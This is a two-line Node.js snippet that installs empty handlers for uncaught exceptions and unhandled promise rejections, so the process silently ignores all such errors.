process.on("uncaughtException", () => {});
process.on("unhandledRejection", () => {});